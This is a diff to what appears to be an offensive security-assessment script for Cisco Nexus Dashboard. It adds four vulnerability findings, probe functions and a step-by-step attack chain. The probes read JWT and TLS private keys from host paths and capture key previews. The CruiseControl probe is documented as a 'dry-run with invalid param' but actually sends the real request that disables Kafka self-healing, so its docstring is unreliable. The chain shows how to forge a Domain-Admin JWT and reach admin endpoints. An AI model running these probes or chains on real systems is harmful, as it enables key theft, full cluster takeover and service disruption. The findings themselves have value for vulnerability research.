@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F24 (HIGH)
+Findings: ND-F01 (CRITICAL) through ND-F28 (MEDIUM). 10 attack chains.
 """
 
 import socket
@@ -845,6 +845,111 @@ FINDINGS = {
         ),
         "chain": "ND-F23 ZK auth -> ND-F24 no-ACL ZK -> full Kafka cluster metadata write",
     },
+    "ND-F25": {
+        "title": "OIDC JWT RSA Signing Key on Host Filesystem — hostPath Mount Exposes Cluster JWT Authority",
+        "severity": "CRITICAL",
+        "component": "authy-oidc container (oidc.bin), hostPath mount from /data/services/kms_etcd/keys/v1/se/",
+        "description": (
+            "The authy-oidc container mounts JWT signing keys from the HOST filesystem via a "
+            "Kubernetes hostPath volume: path=/data/services/kms_etcd, subPath=keys/v1/se. "
+            "The JWT RSA private key (rsa.priv), public key (rsa.pub), and API signing key (api.key) "
+            "are present at /data/services/kms_etcd/keys/v1/se/ on the host. "
+            "These keys are used to issue JWTs for all ND OIDC authentication. "
+            "Any process with read access to the host filesystem at that path — via ND-F01 keyhole, "
+            "ND-F03 KMS etcd noauth, or any container with a hostPath or hostVolume mount — "
+            "can extract rsa.priv and forge a JWT for any user including admin."
+        ),
+        "surface": "Host filesystem at /data/services/kms_etcd/keys/v1/se/rsa.priv",
+        "key_paths": {
+            "rsa_priv": "/data/services/kms_etcd/keys/v1/se/rsa.priv",
+            "rsa_pub": "/data/services/kms_etcd/keys/v1/se/rsa.pub",
+            "api_key": "/data/services/kms_etcd/keys/v1/se/api.key",
+        },
+        "mount_type": "hostPath (direct host filesystem, not a K8s secret)",
+        "env_vars": {
+            "JWT_PRIVATE_KEY_PATH": "/jwtcreds/rsa.priv",
+            "JWT_PUBLIC_KEY_PATH": "/jwtcreds/rsa.pub",
+            "JWT_API_KEY_PATH": "/jwtcreds/api.key",
+        },
+        "impact": (
+            "rsa.priv extraction -> forge JWT for admin user -> full API access to all ND services "
+            "behind /sedgeapi/ APIGW (MSO, NDFC, NIR, licensemgr, aaaserver, etc.)"
+        ),
+        "lateral_path": (
+            "ND-F01 or ND-F03 -> read /data/services/kms_etcd/keys/v1/se/rsa.priv "
+            "-> forge JWT {'sub': 'admin', 'role': 'Domain-Admin'} "
+            "-> call any APIGW endpoint with authType: jwt -> full ND cluster control"
+        ),
+        "chain": "ND-F01 keyhole OR ND-F03 etcd -> extract JWT rsa.priv -> forge admin JWT -> all APIGW endpoints",
+    },
+    "ND-F26": {
+        "title": "storaged and bootstrap TLS Private Keys on Shared KMS Host Path",
+        "severity": "HIGH",
+        "component": "storaged.bin (port 30010 TLS), agent.json (bootstrap TLS), /data/services/kms_etcd/certs/",
+        "description": (
+            "Multiple services load TLS server certificates and private keys from the shared host path "
+            "/data/services/kms_etcd/certs/. storaged binds 0.0.0.0:30010 with server-key.pem "
+            "from /data/services/kms_etcd/certs/v1/kubernetes/. The agent container loads "
+            "TLS from /data/services/kms_etcd/certs/v1/bootstrap/. "
+            "Same host-path read access (ND-F01, ND-F03) exposes all TLS server private keys "
+            "for these services, enabling MitM of storage and bootstrap API traffic on an ND node."
+        ),
+        "surface": "Host filesystem /data/services/kms_etcd/certs/",
+        "affected_services": {
+            "storaged": {
+                "port": 30010,
+                "cert": "/data/services/kms_etcd/certs/v1/kubernetes/server-cert.pem",
+                "key": "/data/services/kms_etcd/certs/v1/kubernetes/server-key.pem",
+                "ca": "/data/services/kms_etcd/certs/v1/kubernetes/cacerts.crt",
+            },
+            "agent": {
+                "cert": "/data/services/kms_etcd/certs/v1/bootstrap/ca-bundle.crt",
+                "key": "/data/services/kms_etcd/certs/v1/bootstrap/server.key",
+            },
+        },
+        "chain": "ND-F01 or ND-F03 -> read /data/services/kms_etcd/certs/ -> MitM storaged:30010 TLS",
+    },
+    "ND-F27": {
+        "title": "Tech Support Bundle Sanitization Bypass — Inner .tar/.tgz Files Not Sanitized",
+        "severity": "MEDIUM",
+        "component": "logmgr log_sanitize.py (SECRETS=/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt)",
+        "description": (
+            "log_sanitize.py sanitizes tech support bundles by scanning log files for lines matching "
+            "secret patterns defined in sanitize-ts.txt. However, the sanitizer explicitly skips "
+            "inner archive files: `if not (mem.name.endswith('.tar') or mem.name.endswith('.tgz'))`. "
+            "Tech support bundles collected by keyhole (/api/v1/techsupport) contain nested .tar files "
+            "from various services. Any secrets (credentials, tokens, certificates) stored inside "
+            "inner archives will not be redacted and will be present in the exported bundle."
+        ),
+        "surface": "keyhole /api/v1/techsupport bundle collection",
+        "sanitizer_path": "/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt",
+        "skipped_types": [".tar", ".tgz"],
+        "dirs_sanitized": ["/logs", "/data/services/app_logs"],
+        "bypass_condition": "secrets stored in *.tar or *.tgz archives within the bundle",
+        "chain": "ND-F01 -> GET /keyhole/api/v1/techsupport -> bundle contains unsanitized inner .tar with credentials",
+    },
+    "ND-F28": {
+        "title": "Kafka CruiseControl Admin Endpoint Unauthenticated — Self-Healing Disable and Kafka DoS",
+        "severity": "MEDIUM",
+        "component": "CruiseControl (infra-kafka, kafka namespaces), cruisecontrol.<ns>.svc:19090",
+        "description": (
+            "The Kafka CruiseControl admin endpoint at cruisecontrol.<namespace>.svc:19090/kafkacruisecontrol/admin "
+            "accepts POST requests with no authentication. upgrade-helper kafka-fns calls this endpoint directly "
+            "to disable goal-violation healing: "
+            "POST cruisecontrol.kafka.svc:19090/kafkacruisecontrol/admin?disable_self_healing_for=GOAL_VIOLATION. "
+            "Present in both kafka and infra-kafka namespaces on ND >= 2.3. "
+            "An attacker with K8s pod network access or via SSRF can disable self-healing, "
+            "leaving the Kafka cluster unmonitored, or POST malformed payloads to trigger CruiseControl instability."
+        ),
+        "surface": "CruiseControl REST API port 19090, accessible from K8s pod network",
+        "endpoints": {
+            "disable_healing": "POST /kafkacruisecontrol/admin?disable_self_healing_for=GOAL_VIOLATION",
+            "status": "GET /kafkacruisecontrol/state",
+        },
+        "namespaces": ["kafka", "infra-kafka"],
+        "auth": "none",
+        "chain": "K8s pod network access -> POST cruisecontrol.kafka.svc:19090/kafkacruisecontrol/admin -> disable Kafka self-healing",
+    },
 }
 
 
@@ -1457,6 +1562,94 @@ def probe_zookeeper_cred(host: str, port: int = 2181) -> dict:
     return result
 
 
+def probe_jwt_key_via_filesystem(kms_etcd_path: str = "/data/services/kms_etcd") -> dict:
+    """
+    Read JWT RSA signing key from host filesystem. ND-F25.
+    Run on the ND host or inside a container with hostPath access to /data/services/kms_etcd.
+    Returns key material if readable.
+    """
+    key_paths = {
+        "rsa_priv": f"{kms_etcd_path}/keys/v1/se/rsa.priv",
+        "rsa_pub": f"{kms_etcd_path}/keys/v1/se/rsa.pub",
+        "api_key": f"{kms_etcd_path}/keys/v1/se/api.key",
+    }
+    result = {"finding": "ND-F25", "kms_path": kms_etcd_path, "keys": {}}
+    for name, path in key_paths.items():
+        try:
+            with open(path, "r") as f:
+                content = f.read()
+            result["keys"][name] = {
+                "path": path,
+                "readable": True,
+                "size": len(content),
+                "preview": content[:80] if "PRIVATE" in content else content[:40],
+            }
+        except PermissionError:
+            result["keys"][name] = {"path": path, "readable": False, "error": "permission denied"}
+        except FileNotFoundError:
+            result["keys"][name] = {"path": path, "readable": False, "error": "not found"}
+    result["jwt_forgeable"] = result["keys"].get("rsa_priv", {}).get("readable", False)
+    return result
+
+
+def probe_kms_etcd_cert_paths(kms_etcd_path: str = "/data/services/kms_etcd") -> dict:
+    """
+    Check TLS private key readability for storaged and bootstrap. ND-F26.
+    """
+    targets = {
+        "storaged_key": f"{kms_etcd_path}/certs/v1/kubernetes/server-key.pem",
+        "storaged_cert": f"{kms_etcd_path}/certs/v1/kubernetes/server-cert.pem",
+        "storaged_ca": f"{kms_etcd_path}/certs/v1/kubernetes/cacerts.crt",
+        "bootstrap_key": f"{kms_etcd_path}/certs/v1/bootstrap/server.key",
+        "bootstrap_ca": f"{kms_etcd_path}/certs/v1/bootstrap/ca-bundle.crt",
+    }
+    result = {"finding": "ND-F26", "tls_keys": {}}
+    for name, path in targets.items():
+        try:
+            with open(path, "r") as f:
+                data = f.read()
+            result["tls_keys"][name] = {
+                "path": path,
+                "readable": True,
+                "is_private": "PRIVATE KEY" in data,
+                "size": len(data),
+            }
+        except Exception as e:
+            result["tls_keys"][name] = {"path": path, "readable": False, "error": str(e)[:80]}
+    readable_privkeys = [k for k, v in result["tls_keys"].items() if v.get("readable") and v.get("is_private")]
+    result["readable_private_keys"] = readable_privkeys
+    return result
+
+
+def probe_cruisecontrol_admin(host: str, namespace: str = "kafka", port: int = 19090) -> dict:
+    """
+    Test CruiseControl admin endpoint for unauthenticated access. ND-F28.
+    Checks state endpoint (GET) and disable_self_healing (POST, dry-run with invalid param).
+    """
+    import urllib.error
+    base = f"http://cruisecontrol.{namespace}.svc:{port}/kafkacruisecontrol"
+    if host:
+        base = f"http://{host}:{port}/kafkacruisecontrol"
+    result = {"finding": "ND-F28", "target": base, "namespace": namespace}
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    for endpoint, method in [("/state", "GET"), ("/admin", "POST")]:
+        url = base + endpoint + ("?disable_self_healing_for=GOAL_VIOLATION" if method == "POST" else "?verbose=true")
+        try:
+            req = urllib.request.Request(url, method=method,
+                                          data=b"" if method == "POST" else None)
+            with urllib.request.urlopen(req, timeout=5) as resp:
+                body = resp.read().decode()[:500]
+                result[endpoint] = {"status": resp.status, "auth": "none", "body_preview": body}
+        except urllib.error.HTTPError as e:
+            result[endpoint] = {"status": e.code, "error": e.reason}
+        except Exception as e:
+            result[endpoint] = {"error": str(e)[:120]}
+    result["unauth_access"] = "/state" in result and result["/state"].get("status") == 200
+    return result
+
+
 # ─── Attack Chain Summary ────────────────────────────────────────────────────
 
 
@@ -1583,6 +1776,26 @@ ATTACK_CHAINS = {
         ],
         "entry_requirement": "ND image file access (ND-F01) OR ZooKeeper port 2181 reachable with extracted cred",
         "findings": ["ND-F23", "ND-F24", "ND-F01"],
+    },
+    "chain_10_jwt_key_exfil_full_apigw_bypass": {
+        "title": "Host Filesystem Read -> JWT RSA Key Extract -> Forge Admin Token -> Full APIGW Bypass",
+        "steps": [
+            "1. ND-F01 cookie -> GET /keyhole/api/v1/techsupport -> download tech support bundle",
+            "   OR ND-F03 etcd KMS noauth -> etcdctl get /keys -> extract JWT key material from KV store",
+            "   OR container escape on any pod with hostPath /data/services/kms_etcd mount",
+            "2. Read /data/services/kms_etcd/keys/v1/se/rsa.priv -> RSA-2048 private key (ND-F25)",
+            "3. Craft JWT: {'sub':'admin','role':'Domain-Admin','iss':'nd-apigw','exp':<far future>}",
+            "4. Sign with rsa.priv using RS256 -> valid ND JWT token",
+            "5. All APIGW endpoints with authType:jwt accept the forged token:",
+            "   POST /api/v1/licensemgr/ -> grant unlimited license",
+            "   GET  /sedgeapi/v1/authy-ldap/api/ -> dump all LDAP auth config",
+            "   ANY /api/v1/<service>/ endpoint across MSO/NDFC/NIR",
+            "6. Alternate: api.key (HMAC) -> forge API key JWTs for service-to-service tokens",
+            "7. ND-F27: tech support bundle contains inner .tar archives with unsanitized creds",
+            "   -> single bundle pull yields JWT key + TLS keys + service passwords",
+        ],
+        "entry_requirement": "ND-F01 world-readable cookie OR ND-F03 etcd noauth OR container escape",
+        "findings": ["ND-F25", "ND-F01", "ND-F03", "ND-F27"],
     },
 }
 
